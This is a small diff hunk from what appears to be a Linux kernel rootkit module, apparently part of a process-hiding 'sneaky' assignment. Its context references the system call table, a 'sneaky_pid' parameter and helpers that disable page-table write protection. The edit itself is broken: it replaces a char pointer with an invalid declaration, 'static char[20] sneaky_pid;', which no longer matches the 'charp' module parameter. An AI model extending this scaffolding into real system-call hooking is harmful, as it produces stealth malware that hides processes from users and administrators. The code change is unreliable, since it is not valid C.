@@ -15,7 +15,7 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
-static char * sneaky_pid = "";
+static char[20] sneaky_pid;
 module_param(sneaky_pid, charp, 0);
 
 // Helper functions, turn on and off the PTE address protection mode
